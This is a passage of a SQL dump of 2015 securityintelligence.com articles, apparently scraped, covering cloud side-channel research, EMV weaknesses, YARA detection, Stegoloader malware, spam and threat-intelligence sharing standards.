wider array of attacker groups,  , state-sponsored consortia and cybercriminal organizations. Let’s say you’re fairly sure that your network may have been compromised. What do you do? There’s a good chance your first response would be to panic. Yet over the last few years,   and tools have been developed and made available to the public — some for free, and others for a price. Either way, they can assist with digging in and identifying an IoC on your network, allowing you to build detection capabilities to find the root cause of a specific attack type and prevent breaches from recurring.', '\'Advanced Threats\', \'Indicator of Compromise (IoC)\', \'Security Intelligence\', \'Threat Intelligence\', \'Threat Protection\'', 'https://securityintelligence.com/hidden-warnings-a-look-at-indicators-of-compromise-ioc/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (394, 'Platform-as-a-Service (PaaS) Cloud Side-Channel Attacks: Part II', 'Brad Harris', '2015-6-30', 'In   of this blog post, we delved into some of the security concerns for organizations using platform-as-a-service (PaaS)  . As part of that, we: defined side-channel attack; discussed nondeterministic finite automata (NFA) and how their specific attack NFA works; described the FLUSH+RELOAD side-channel attack based on the last level cache, shared by all cores of a physical CPU; and discussed the requirement of collocation on the physical CPU in order for the attacks to succeed. Now, we will cover the three attacks mounted by authors Y. Zhang, A. Juels, M.K. Reiter and T. Ristenpart as part of their research in “ ” against the   technology. The researchers begin by attacking a popular e-commerce product in order to infer sensitive data. In this case, they determined how many items were in a user’s shopping cart. Firstly, they document the assumptions. The attacker is striking a target user who has already authenticated to the server. However, it’s not possible to obtain the target user’s credentials. Finally, for the cross-site request to work, the adversary must lure the victim into coming to the attacker-controlled website. This is usually not practical because once users have authenticated to the e-commerce server, they typically follow links from that server. The attacker depends on cached credentials such as cookies. If these assumptions were to be true, however, the attacker can use a manually constructed NFA, the parameters of which are obtained through the use of the Valgrind tool suite, to monitor the target PHP process. The NFA monitors a particular handler function within the PHP software that is invoked each time an item is added to the cart. Therefore, for every detected invocation, the attacker can infer that an item has been added, allowing the attacker to determine how many items are in the cart. Section 5 of the report has details of the attack. The second attack relies upon the use of weak pseudorandom number generators (PRNGs) such as those found in many executables. The authors choose to attack their chosen PHP implementation’s PRNG. They once again attack the chosen e-commerce platform but also identify that a popular blogging platform contains the same weakness. Many attacks against PHP random number generators have been demonstrated, such as those in “ .” This paper also presents a password reset attack but, as the authors of the paper indicate, over a much smaller search space. The authors also rely upon the seed values being the output of the   function and the   function to seed the PRNG. Since this is the case in their chosen PHP implementation, the attack can proceed. It also relies upon the lack of a call to  , forcing the seeding of the   call with a default value. The attacker first creates an account on the target website. He or she then saturates the server or PHP process with requests such that a new process is spawned to serve them. Then, the attacker requests a password reset itself. He or she monitors the   function using the NFA and, when the call is detected, calls the function immediately such that the values are only microseconds apart. Since the attacker knows that the process’s ID will not change, he or she can use the secret string that the server sends to brute-force the output of  , which only has 2  possible values in a Unix-like operating system such as Linux. The attacker then monitors the calls to   and   and can thereby guess the pseudorandom value at any given point. The particular e-commerce platform serves fast common gateway interface (CGI) processes with new processes, so the attacker must crash the PHP process. Once these conditions are met, cybercriminals send two   reset requests: one for their created account and one for the targeted user. When the attacker receives the reset secret at the controlled account, he or she uses the time information obtained from the side channel in order to brute-force the process ID (PID) of the process. This is only 2  trials. The authors discovered that there was at maximum a one-bit error in the different measurements of  , and in the victim application, this was called four times. This resulted in a 20-bit space to search. Note that the brute forcing is offline; that is, it requires no connection to the server because it can use the secret obtained from the password reset request. Then, because there are two more calls to   with potentially one bit of error, the attacker must connect to the website a maximum of four times in order to send the correct secret to reset the target user’s password and hijack the account. Because four is the maximum number of requests, there is no account lockout triggered. Section 6 of the paper provides a more detailed description. The third attack is against an open-source security assertion markup language (SAML) implementation. SAML is the language used by many single sign-on providers to clouds. The authors used the side channel to enable a so-called Bleichenbacher attack, described in D. Bleichenbacher’s “ .” It relies upon a known ciphertext and can decrypt but not recover the key. The attack takes advantage of the fact that the chosen target can be forced to use the vulnerable PKCS #1 v1.5 standard. Implementations have simply created countermeasures for the known attack vectors, which allows for the new vector to exploit the weakness in the standard. The target is the XML encryption standard, which can now once again be broken. The attacker can decrypt based upon the PKCS #1 v1.5 padding scheme, which has a known format. This permits the verification of possible decryptions. First, the adversary monitors libcrypto.so, a component of OpenSSL, particularly the basic blocks responsible for calling the padding error function. This avoids the countermeasures mentioned above, which preclude a timing-based attack. The attacker gets an empirical measure of the time it takes to call the error function itself by sending first conformant and then nonconformant paddings. The authors use a 12 percent error rate for each invocation of  , where   is the number of requests to the padding oracle for each chosen padding. The attacker then measures to see if the error function is invoked. They observe that when   = 7, there were no false positives. When   = 7, the probability of a false negative is 1 percent. To break a 2048-bit RSA key, the authors estimate the number of queries at 2,345,455, which is clearly impractical. Thus, while the third attack is interesting academically, it is almost certainly not applicable to the real world. Refer to section 7 of the paper for details. To conclude, these blog posts explore side-channel attacks against a PaaS cloud popular among websites that share common executables. This sharing allows the use of a cache-based side channel to monitor the execution flow of the target running these executables. Practically, the second attack presented is clearly the most damaging — and the most realistic — while the first and third are a bit more difficult to reproduce in a real-world situation. The first attack requires that the adversary somehow lure a user to a website under his or her control. The typical way to do this is to inject cross-site scripting into the target’s website. Therefore, making sure your website is not vulnerable to   should limit this threat. This is a safety measure that should already be deployed on your website, as cross-site scripting can be very dangerous in all its forms. The third attack is very interesting from a researcher’s perspective, but requires so many queries to the XML padding oracle that it is not practical. However, note that the attackers did successfully perform this attack on a commercial cloud service, so it is possible. Make sure your website does not allow a large number of queries from a given IP or user without locking that user out. The lock may be temporary, but even this will slow down the cybercriminal and make the third type of attack even more impractical. The attacker will have to use a “slow-and-low” style, which should take an inordinate amount of time to complete. If you don’t like the idea of locking users or IPs out (for example, an IP lock may prevent multiple users on NATed networks from accessing your website), consider throttling the query speed after a certain number of queries from a user or IP. Create a password policy that forces the user to change passwords after a certain length of time. This will make the attack extremely unlikely since the ciphertext will change too fast. Finally, use a large RSA key, such as 4096 bits. In modern hardware, this key size is very practical and would require so many queries that the attacker will almost certainly give up and go after an easier target. If you are the specific target, the number of queries required to decrypt a specific ciphertext should exceed the lifetime of your website.', '\'Cloud\', \'Cloud Security\', \'Cross-Site Scripting (XSS)\', \'Platform-as-a-Service (PaaS)\', \'Side-Channel Attack\'', 'https://securityintelligence.com/platform-as-a-service-paas-cloud-side-channel-attacks-part-ii/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (395, 'Is PCI Compliance Enough to Protect Us From Advanced Threats?', 'Omner Barajas', '2015-6-24', 'There are several threats around the payment card industry (PCI) receiving wider public scrutiny now that the chip-and-PIN standard is set to become mandatory in the U.S. by Oct. 1, 2015. The Europay, MasterCard and Visa (EMV) standard is being implemented after years of use in Europe, and it will institute a liability shift whereby the party causing a fraudulent transaction will be responsible for losses.\n EMV is seen by many as the logical starting point when building secure online banking paths that are sure to keep you updated and ready for changes and evolving attacks long-term. However, researchers from   have detailed two major problems about the implementation of such a standard and its potential flaws, which may affect the public’s positive view of the standard.\n The first implementation flaw describes how EMV cards generate what is supposed to be an unpredictable number for each transaction to ensure its integrity. However, the implementer could have used counters, time stamps or homemade algorithms to supply this figure. Consequently, an attacker would be able to identify computation patterns that would allow him or her to predict the randomly generated numbers. This so-called preplay vulnerability could be exploited by cybercriminals to clone credit and debit cards in such a manner that even bank procedures won’t differentiate between legitimate and fraudulent transactions.\n The second vulnerability discovered involves protocol implementation. An attacker can swap out the number generated by an ATM or payment terminal with one from a cloned card, even when a cryptographically strong random number is generated. That flaw is due to attackers’ ability to intercept the random figure via a man-in-the-middle (MitM) attack and replace it with a different one, which would likely pass the authorization process with no issue. Such an attack could be executed via malware installed on point-of-sale (POS) devices, even if those devices include tamper-resistant EMV modules. A good example is the  , which infects POS systems worldwide and remains active at the time of writing this article.\n The above threats give us an idea about how creative cybercriminals can be in their attempts to take advantage of flaws and vulnerabilities caused by poor implementation by banks and vendors. It is difficult to enforce standardization and high-quality, secure development, leaving the door open for attacks.\n  are being discovered and developed at an alarming rate — faster than fixes and solutions to prevent them. If EMV proves to be inefficient in the coming months, in five years we can expect a PCI standard overwhelmed by advanced threats and overcome by customer needs.\n In contrast,   could be the solution that moves us forward to the next generation of online transactions. Companies like PayPal, Leaf, Square and others want to compete in this market. To do so, they are introducing mobile and cloud services that offer a bridge between online and offline worlds by pairing mobile registers and additional merchant services with smartphones.\n The next generation of threats requires a new approach to PCI security. As these threats evolve, so must the security strategies used to combat them. Let’s move away from security based on compliance and look forward to strategies that provide better understanding of the technologies used to protect data in order to build solutions that take us into the future of information security.', '\'Advanced Threats\', \'EMV\', \'Man-in-the-Middle (MitM)\', \'Payment Card Industry (PCI)\', \'Payment Card Industry Data Security Standard (PCI DSS)\', \'Point-of-Sale (POS) Systems\', \'POS Malware\', \'Vulnerabilities\'', 'https://securityintelligence.com/is-pci-compliance-enough-to-protect-us-from-advanced-threats/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (396, 'Signature-Based Detection With YARA', 'Koen Van Impe', '2015-6-24', 'In a previous post, I talked about how you can use   to share threat intelligence. One of the key elements for putting cyberthreat information to good use requires that the information is actionable, or at least usable. The shared information has to be accurate, complete and relevant for your environment. CybOX provides a common structure for representing cyber observables across and among the operational areas of enterprise cybersecurity. CybOX can contain hashes, strings or registry keys. Information provided via the system can be used to check for the presence of malware inside your environment. YARA is one of the alternatives to using CyBOX, but the two are not mutually exclusive. YARA is a tool designed to help malware researchers identify and classify malware samples. It’s been called the   for security researchers (and everyone else). It is multiplatform and can be used from both its command-line interface or through your own Python scripts. The tool allows you to conduct signature-based detection of malware, something similar to what antivirus solutions can do for you. In order to use this method, you need a rule and a file that you want to check. For example, to run it from the command line, you would use: \n \nThis will output if the given rule matches on the provided file. If you don’t see output, and you have not used the negate option, then this means that no rule has matched. You can start it with a number of configuration switches; these are the two most important : A rule is a set of strings and some form of logic, written in Boolean expressions. There is support for three different types of strings: The conditions are Boolean expressions that you will recognize from regular programming languages. They can work on any of the given strings but also on special built-in variables, such as the file size, or on external variables that you define outside the rule. There is also support for the use of modules, such as Cuckoo, to extend the features that you can use in the conditions. You’ll benefit the most from YARA if you provide it a good ruleset. You can either write your own rules or get them from another provider. Writing your own rules is not that difficult if you take these guidelines into consideration: Once you have analyzed the malware and extracted useful, recognizable data from it, you can then transform the information into YARA strings and combine them with some form of logic. Because YARA uses signatures similar to antivirus solutions, it would make sense to reuse these signatures as a rule database. With the use of the script  , you can convert the ClamAV signature database to your own ruleset. Another source for rules is the Github repository  . This is a ruleset under the GNU-GPLv2 license maintained by a group of IT security researchers. The rules are stored in different categories — rules aimed to detect anti-debug and anti-visualization techniques, malicious documents, packers, etc. — and frequently updated. You can get them by cloning the Github repository. Some threat intelligence sharing platforms, such as   and  , also support YARA. This allows you to build rules based on your own collected threat information. With the use of the   from Joe Sandbox, you can create signatures for Windows based on static and dynamic behavior data. Note that the same rules apply as when using  . You are uploading your files to an external cloud service, which shouldn’t be done with sensitive files or data containing any form of user credentials. I mentioned earlier that you can convert the ClamAV database to a usable ruleset. It also goes the other way around. Suppose you have a set of detailed rules. You can configure ClamAV to extend its feature set with your provided rules and  . This allows you to match the rules on compressed or packed files. The   private API also has a feature with which you can enter your own rules and have them triggered when a matching sample is uploaded. Only relying on signature-based protection is no longer good enough. Attackers have developed countermeasures that they can use to bypass this method. With the use of various crypting services, packers and polymorphism, they can easily generate malware that’s different enough so that it no longer matches existing signatures. It then takes some time before the new flavor is picked up and a signature is shared. These drawbacks don’t make signature-based detection obsolete. The security community is strong at sharing new threat indicators, so these types of tools will still prove to be an important asset to your arsenal. Although signature-based detection with YARA has its limits, it is an easy-to-use and fairly simple way of detecting malware in your environment. It would not be wise to rely on it as the only   measure, but given the straightforward use, missing out on this tool would not be a good idea, either.', '\'CybOX\', \'Malware\', \'Malware Analysis\', \'Sandbox\', \'STIX\', \'TAXII\', \'Threat Detection\', \'Threat Intelligence\', \'Threat Sharing\'', 'https://securityintelligence.com/signature-based-detection-with-yara/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (397, 'Platform-as-a-Service (PaaS) Cloud Side-Channel Attacks: Part I', 'Brad Harris', '2015-6-23', 'Cloud computing has become ubiquitous as more and more companies move their infrastructure to the cloud, run software from the cloud on local thin clients and use the cloud for Web services. Customers — called tenants — realize cost savings over maintaining their own computing setup, making the cloud a very tempting alternative. Infrastructure-as-a-service (IaaS) clouds allow tenants to scale the number of computing resources they have available based upon current demand. These clouds use virtual machines to provide this scalability, allowing tenants only to pay for what they need at any given time. Software-as-a-service (SaaS) clouds allow a tenant to provide very thin clients to its users such that it can utilize software on the cloud through a Web-based interface in most cases. Platform-as-a-service (PaaS) clouds are a sort of  . They allow multiple tenants to share one environment, isolated occasionally by virtual machines, but more typically using technologies such as  . Linux Containers provides a weaker level of isolation as compared to virtual machines because it shares the same operating system kernel; however, it does provide strong isolation among users. Linux Containers is often considered strong enough for the PaaS cloud, where the users all share one setup or environment, with the Containers isolating particular instances of that environment. For example, all tenants share a single PHP executable, a single Ruby on Rails instance and other programs utilized in Web servers. They often have the ability to run custom programs from within their Container in order to provide custom CGI scripts. It is this sharing of executables and the fact that Containers shares one kernel and one hardware compute node, which gives rise to some very sophisticated side-channel attacks. Side-channel attacks typically occur when hardware leaks information to a potential attacker. This data can be very valuable, as we will discuss. It should be noted that side-channel attacks exist for all three cloud types, but we will be focusing on a research paper regarding PaaS cloud side-channels. In November 2014 at the  , Y. Zhang, A. Juels, M.K. Reiter and T. Ristenpart presented their report, “ .” In this work, the authors construct a framework for the exploration of side-channels based on the shared CPU cache. They also conduct three successful attacks. Firstly, they use a cross-site request (a more general attack than cross-site scripting, though that would certainly work, too) to determine how many items the target has in a popular e-commerce product’s shopping cart. Then, they use a flaw in the PHP random number generator to hijack a user account on a target website by requesting a password reset. Finally, they demonstrate an attack on an open-source SAML provider, which allows one to defeat the XML encryption in order to impersonate a user. The authors first build a framework based on a nondeterministic finite automaton (NFA), which uses the executable’s control flow graph to determine which sections of memory are of interest to the attacker. The attacker can construct a partial control flow graph from the compiled executable and only monitor those interesting control paths, but this requires some reverse engineering of the application. However, with the PaaS cloud, the software used is often open-source, which means the source code is available to the attacker. At this point, the attacker can build a thorough control flow graph by using compiler-style static analysis. Note that to be entirely accurate, the attacker should know with which options the program was compiled. Also, there will be dynamic code in the executable, such as indirect jumps, which will foil most types of static analysis. Having source code minimizes these difficulties. See section 3.3.1 of the report for a detailed description of how control flow graphs are created and monitored. An NFA is essentially a finite automaton (FA) that at some point uses an arbitrary choice to transition from one state to the next. An FA uses a graph (in this case, a control flow graph) to advance from one state to the next. It can be thought of as a state machine in which each node of the graph can transition to a finite set of edges to reach the next state. This is intuitively what happens during the execution of a program as its flow proceeds from one basic block to the next. The attack NFA is set to monitor these chunks of memory looking for changes. It becomes nondeterministic when there are too many possible states (based on the monitored memory chunks) to make a correct decision as to the next state. At this point, an arbitrary state is chosen. See section 3.2 of the paper to get a thorough definition of the attack NFA. The construction of the NFA is a largely manual process no matter how well the control flow graph is constructed. This is one limitation of the attack, but if the attacker has a particular target in mind, the construction of the automaton may be well worth the time and effort. The NFA uses the control flow graph to monitor specific chunks of memory by way of the FLUSH+RELOAD cache side-channel attack, as described in Y. Yarom and K. Falkner’s “ ,” presented at USENIX Security 2014. This attack relies on the typical behavior of operating systems’ deduplication of shared memory pages — that is, shared objects (such as libraries) are loaded only once and then are mapped into each process that requests them. This saves memory, and since the pages are write-protected, the CPU and the OS kernel make sure that no process can change them — even privileged processes. This deduplication is critical for the FLUSH+RELOAD attack. There are other attacks that do not rely upon this feature, but this attack typically has less noise and a finer resolution. Even though the FLUSH+RELOAD attack is relatively clean of noise (a phenomenon that causes false negatives or false positives), there are still significant challenges to overcome. Section 3.3.2 offers a description of sources of noise and the methods the authors use to overcome them. Four methods are used to do this: A requirement for the attack to succeed is the collocation of the attacker processes and target processes on the same CPU (not core, but physical CPU). This can be done by launching several instances of the attacker setup and then checking for collocation with the target. The authors do this by sending Web requests to the target and monitoring with the FLUSH+RELOAD attack to see if the target follows the correct control path. Section 4 of the report provides the details of collocation detection. For more information read   of this series, which discusses the three attacks mounted by the authors in more detail and describes the general form and steps of each attack.', '\'Cloud\', \'Cloud Security\', \'FLUSH+RELOAD\', \'Infrastructure-as-a-Service (IaaS)\', \'Linux\', \'Platform-as-a-Service (PaaS)\', \'Side-Channel Attack\', \'Software-as-a-Service (Saas)\'', 'https://securityintelligence.com/platform-as-a-service-paas-cloud-side-channel-attacks-part-i/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (398, 'Stopping the Evasive Stegoloader Malware', 'Dana Tamir', '2015-6-22', 'The Stegoloader malware family was first identified at the end of 2013 but appears to have been active since 2012. This stealthy and opportunistic information-stealing malware uses digital steganography , hiding a core component of the malware within a portable network graphic (PNG) hosted on a legitimate site. As Stegoloader executes, it downloads that core component and then uses digital steganography to extract the code from the image. Stegoloader uses a few sophisticated techniques that allow it to evade detection, circumvent analysis tools and remain stealthy. For example, it has a modular design that allows the attacker to deploy different modules as necessary. The malware’s use of modules limits malware researchers’ ability to expose its capabilities and makes the investigation and reverse engineering analysis extremely difficult. As a result, it’s difficult to fully assess the attacker’s intent. The first malware module to operate is the deployment module, which is responsible for the malware download, followed by the launch of the main module. The main module’s code is hidden inside a PNG image downloaded from a legitimate website. This module does not have persistence. Neither the PNG image it downloads nor the decrypted code is saved to disk, making the malware difficult to find via traditional signature-based  . The malware will suspend the execution of its main program code if it detects any analysis or security tools running on the compromised system. Before executing, the malware checks that it is not running in an analysis environment by looking for mouse movements. If no mouse movements are observed, it is likely that it’s running in a synthetic environment, such as the ones used by   solutions. It will then stop executing. In addition, it looks for running processes of security products or tools used for reverse engineering and can terminate those. The malware also uses a known technique for the dynamic construction of code strings, which complicates detection and analysis. The Stegoloader malware is stealthy in many aspects: It evades analysis tools and deploys only necessary modules without writing them to disk. Therefore, discovery and mitigation become immensely difficult. In order to defend against this type of malware,   is needed. This defensive approach combines integrated, multilayered defenses spanning the prevention, detection and response to break the threat life cycle and offer continuous protection. Unlike signature-based antivirus solutions, this approach doesn’t require a signature of the malicious file to identify the threat. In fact, no prior knowledge of the threat is needed: There is no need to know how the threat operates, which command-and-control (C&C) servers it tries to communicate with or which components are involved. Instead, it disrupts the process that Stegoloader and other types of malware use to download modules and prevents subsequent execution. Because it is not dependent on prior knowledge of the threat, advanced malware protection and mitigation can be effective against zero-days threats as well as evasive malware that attempts to bypass existing security controls. With that, it addresses a critical gap in today’s cyber defenses, empowering organizations to better protect against advanced threats, targeted attacks and APTs. A large number of machines infected with the evasive Stegoloader Trojan were detected at North American healthcare organizations, so says a   from Trend Micro. According to the report, the majority of the observed infected machines during the last three months were based in the United States (66.82%). Interestingly, 42.65% of the total infected machines are from US Healthcare organizations.  The report also states  that its researchers are currently looking into how cybercriminals can use this for organized attacks: “Although yet to be seen in attacks, steganography can potentially be a new technique cybercriminals looking to perform healthcare attacks can use to expose medical records in the future.” Healthcare organizations in North America have become a popular target for hackers recently. Back in February, we learned that Anthem, the second biggest health insurer in the US, was the target of a major cyber-attack. The health insurance company said that the attack may have exposed 80 million records of both customers and employees, containing sensitive information like social security numbers, birthdates, addresses, phone numbers, email addresses and member IDs. A month later, we learned of another attack this time targeting Premera Blue Cross. According to reports, the hackers may have taken up to 11 million customer records. It has been   that in a private message   last year, the FBI warned healthcare providers that their cybersecurity systems are lax compared to other sectors, making them vulnerable to attacks by hackers searching for Americans’ personal medical records and health insurance data. Some believe that healthcare data can be worth 10 times more than credit card information on the black market. According to researchers at Dell SecureWorks, cyber criminals can be paid $20 for health insurance credentials on some underground markets, compared with $1 to $2 for U.S. credit card numbers. As mentioned above, organizations can help stop the Stegoloader Trojan threat with IBM’s advanced malware protection and mitigation. This defense approach combines integrated multi-layered defenses spanning prevention, detection and response in order to break the threat lifecycle and help provide continuous protection. Because it is not dependent on prior knowledge of the threat,   can be effective against zero-days threats, as well as evasive malware that attempts to bypass existing security controls. With that it addresses a critical gap in today’s cyber-defenses, empowering organizations to better protect against advanced threats, targeted attacks and APTs. \n  The word steganography combines the Greek words steganos (στεγανός), meaning “covered, concealed or protected,” and graphein (γράφειν), meaning “writing.”', '\'Advanced Threats\', \'Digital Steganography\', \'Malware\', \'Stegoloader\', \'Threat Intelligence\'', 'https://securityintelligence.com/stopping-the-evasive-stegoloader-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (399, 'No One Expects a Spam-ish Imposition', 'Pamela Cobb', '2015-6-22', 'IBM X-Force has been beating the drum for years on the hazards of spam. With the network capturing over 12 million spam and phishing attacks daily, X-Force researchers dissect and analyze trends and samples with a level of scrutiny that seems out of sync for a security hazard downgraded to mere annoyance by many organizations. Although less troublesome than a flesh wound, spam has evolved from scattershot personal medical enhancements to socially targeted campaigns sold by for-profit operators. Back in the dark ages of 1978, the first unsolicited email was sent to all members of ARPANET, although the term “spam” was not applied to these messages until 1993. In the Controlling the Assault of Non-Solicited Pornography and Marketing (CAN-SPAM) Act of 2003, the U.S. Federal Trade Commission enacted a law that sets the rules for commercial email and requires opt-out processes in an effort to curtail the practice of sending spam. Today, most spam is created by for-profit operators who can attach malware to the spam message to infect networks. Any sort of adversary with the right motivation can hire a spam operator that will build a custom campaign to trick users to open an attachment or click on a link, infecting the corporate network with ransomware or malware faster than an unladen swallow. This attack vector is just one way to create the  , which IBM identified as the source of 23.5 percent of attacks in 2014. When X-Force looked at spam in a 2014 report, we focused on the re-emergence of image-based spam, which was engineered to evade keyword detection-based filters. Image-based spam reached its heyday in 2006 to 2007, with 40 percent of all spam containing an image attachment. By the summer of 2007, however, those levels dropped to nearly zero until late 2013, when image attachment rates surged to prior levels. One of the other hazards of spam is the potential for embedded or attached malware. Just before that image-spam surge in 2013, the rate of spam carrying malware rarely exceeded 1 percent of the total volume. In the “ ,” however, X-Force showed that 2014 brought a quadrupling of that malware attachment rate. One such example is the Upatre downloader, which, when opened as an attachment, contacts a command-and-control (C&C) server and downloads Dyre malware, a particularly insidious  . This rise and fall in attack vectors is unsurprising since it’s a common practice for attackers to recycle techniques as security practices become complacent. Often, to increase performance of security products via memory conservation or increased throughput, old signatures get removed or default blocking rules are turned off, paving the way for older attacks to slip through defenses. Most spammers are operating as for-profit ventures, buying payloads for campaigns whether they are seeking financial gain or theft of intellectual property. The campaigns are cheaper to manufacture when they reuse techniques like image-based spam or infected RAR/ZIP attachments because older code can be recycled or updated with new malware. With an added bonus of a potentially increased success rate, the spammers have double the incentives to run back these techniques. The bright side for your organization, however, is that spam has been around for such a long time that there are some solid practices to combat it. No one likes spam, but there are some basic steps you can take to   to your organization: Unfortunately, technology is not usually the weakest link in the chain for spam: It’s your  . User education should take as important a role as email protection technology, if not more so. Encourage users to exercise common sense and avoid opening attachments from unknown or expected sources. Given the prevalence of spam, not having rigorous user education in place is the equivalent to trying to cut down the mightiest tree in the forest with a herring.', '\'Email\', \'IBM X-Force Research\', \'Spam\', \'Spam Emails\', \'X-Force\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/no-one-expects-a-spam-ish-imposition/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (400, 'Navigating a Sea of Threat Intelligence Specifications', 'Doug Franklin', '2015-6-19', 'Several publications have already nominated 2015 as “The Year of Threat Intelligence Sharing,” and threat intelligence sharing has certainly been in the news. Though the first half of the year has seen little in the way of new specifications, entire ecosystems of standards that few people previously knew have finally gained some recognition due to their use in threat intelligence sharing efforts. Much current attention goes to what I will call the DHS specifications. The U.S. Department of Homeland Security (DHS) leads these community-driven efforts, and the MITRE Corporation provides them with an electronic home. These specifications include the well-known Common Vulnerabilities and Exposures (CVE) and Common Vulnerability Scoring System (CVSS) efforts, among a wealth of others.  , specifically, have drawn recent attention. The   specification defines a representation for observable attributes of computer and network activities and entities. Observables include things like files, HTTP sessions, X509 certificates and others, including system configuration items. The CybOX specification essentially provides a standardized but extensible vocabulary for describing the things we may observe about a computing system and its operations. Indicators, on the other hand, are observables set in a particular context. For example, the name of a Windows registry key could be an observable. That observable having a specific value, however, could be an indicator of the presence of a threat. IP addresses represent another sort of observable, and particular ones can be indicators of malicious intent. The   provides a standardized XML-based language to express the details of threat intelligence items and threat context. It uses CybOX as the expression language for many of the elements that STIX syntax can represent, but it can also contain information expressed in other formats. The standardization allows security researchers and practitioners to exchange threat intelligence with much lower risk of miscommunication, and it enables certain forms of automated processing of threat intelligence items. The STIX specification includes structures to represent many aspects of security intelligence in practice, including threat actors, threat campaigns, security incidents and others. It makes heavy use of other DHS specifications to specify formats for the data items each STIX entity contains. The   offers secure transportation and interchange of threat intelligence information. Many articles make it seem that TAXII only supports STIX-formatted content, but it can transport information in a wide variety of formats. However, current practice typically teams TAXII transport with STIX expression and CybOX vocabulary. TAXII defines the exchange protocol in terms of standardized services and message exchanges that support multiple sharing models, including hub-and-spoke, peer-to-peer and subscription. While TAXII provides secure transport, it avoids policy considerations such as topology, trust issues and governance. Higher-level protocols and agreements must address the policy concerns. Most recent articles focus intensely on STIX, TAXII and CybOX. Some don’t even mention that CVE and CVSS also play a role in the ecosystem. Many don’t mention the other, complementary specifications in the DHS suite. The   and   specifications standardize the description of platforms and configurations in the same way that CVE standardizes descriptions of vulnerabilities. The   provides a set of metrics based on CVSS. Less well-known are: And the stable contains others, as well. Taken together, they aim to cover the entire scope of the security communication space in a sort of normalized fashion. Part of the stir surrounding the sharing of threat intelligence includes announcements by various commercial and open source projects that they are adding support for the STIX, TAXII and CybOX specifications and their relatives. In many cases, these notices serve simply to remind everyone that the project already has support and tracks the specifications as they evolve. These specifications have all been around for at least a couple of years, and a wide variety of the available tools already support them. At least for now, support will be a requirement for new entrants into the market simply due to the buzz surrounding them. Remember that the current efforts in the private sector are not the first attempts to encourage threat intelligence sharing, and they are not the only game in town, either. In particular, reality forced the military and intelligence organizations to manage and share threat intelligence within their own operations and those of their partners, such as weapons system development companies. The first efforts toward greater threat intelligence sharing date at least to 1998 in the form of Presidential Decision Directive/NSC-63, “Protecting America’s Critical Infrastructures,” issued by former President Bill Clinton. This directive resulted in the establishment of the National Infrastructure Protection Center (NIPC) and a variety of Information Sharing and Analysis Centers (ISACs). In 2004, the Intelligence Reform and Terrorism Prevention Act established the U.S. Computer Emergency Readiness Team’s (US-CERT) National Cybersecurity and Communications Integration Center (NCCIC), the FBI’s National Cyber Investigative Joint Task Force (NCIJTF) and U.S. Cyber Command. In addition, a variety of players created the Industry Consortium for the Advancement of Security on the Internet (ICASI) in 2007, and specific industries also created focused threat intelligence exchange efforts, particularly in health care, with the HITRUST Alliance. And those are just the efforts on the civilian side. You might imagine that military and intelligence forces and   have specialized risks, requirements and threats. The cold hand of reality compelled these forces to take the issues more seriously than the rest of us. Their standardization efforts in the U.S. revolve around the Defense Information Systems Agency (DISA) and the U.S. National Institute of Standards and Technology (NIST). NIST produces specifications regarding system security, as well, specifically the Cybersecurity Framework, and hosts the Computer Security Resource Center. DISA produces   to standardize secure installation and maintenance of information systems. This high-level term refers to a wide variety of standards that contain technical guidance, allowing installers and maintenance personnel to lock down systems that might otherwise be vulnerable to attack. More recently, these organizations have been moving toward fully embracing the NIST’s  . The   provides official SCAP mappings. This suite of open standards aims to enable automated management and measurement of security configurations as well as threat intelligence sharing. Though not often mentioned, the STIX protocol can encapsulate SCAP payloads just as easily as any other expression. In fact, many of the standards covered by the SCAP umbrella come from the DHS suite, a welcome convergence of practice. SCAP actually comprises the following standards: All of those except XCCDF, OCIL and CCSS come from the DHS suite, and NIST defines the rest. XCCDF provides a standard representation for structured collections of system configuration rules. The standard supports automated information interchange along with compliance testing and scoring, while organizations can still tailor its use to their needs. Compared to the DHS suite, XCCDF overlaps most with CCE. Luckily, that is the only significant difference between the SCAP umbrella and the DHS suite of specifications. OCIL provides a standardized framework to express checklist questions and procedures to interpret the responses to the questions, while CCSS has a set of metrics to measure the severity of software configuration issues. It is derived from the well-known CVSS specification to provide a similar capability. The   package of standards covers roughly the same territory as the DHS suite of specifications, particularly CybOX, STIX and TAXII. The MILE standard itself defines a data format for indicators and incidents. The package also includes the  . This incorporates many of the DHS suite specifications for its data field formats, provides a format for exchange of operational and statistical incident information and supports automated processing. The package also includes IODEF for   extensions and  , supporting automated intelligence and incident sharing. A number of other efforts also exist, either to fill perceived gaps in the coverage of the existing standards and specifications or to correct perceived flaws in them. The Mandiant-developed   specification provides a vocabulary for technical details of indicators of compromise. It has some overlap with CybOX but also expands the available vocabulary. Verizon produced the   standard to define a vocabulary of metrics for describing security incidents. As with OpenIOC, it has some overlap with CybOX, but it also expands the available vocabulary. Finally, US-CERT developed the  . This specification provides a set of designations rather than a data format but could easily be included in any relevant standard or specification. TLP classifies intelligence that might be shared to control the scope of sharing. It defines four levels of sharing and identifies each one with a color: Neither the concept nor the practice of   is revolutionary. Renewed interest can be laid at the door of the successes that attackers have enjoyed over the last few years. The news has been full of the publicly disclosed incidents, and you can bet that quite a few undisclosed ones occurred, as well. The combination of widespread interest and need drive the current activity. Attackers have been painfully successful lately, and we defenders must up our game. Threat intelligence sharing can help us do that. With the need so obvious, activity swirls around threat intelligence sharing at the moment and is unlikely to wane until the situation improves. Luckily, the history of these efforts provides us with experienced practitioners, and the standards and specifications appear to be driving to a convergence. Until that moment arrives, the tools will have to support competing standards in at least some cases. But current work appears to be driving toward a (mostly) converged environment with a variety of products and projects integrating the standards and capabilities to acquire, package, exchange and consume standards-based threat intelligence data.', '\'CybOX\', \'Security Intelligence\', \'STIX\', \'TAXII\', \'Threat Intelligence\', \'Threat Sharing\', \'U.S. Computer Emergency Readiness 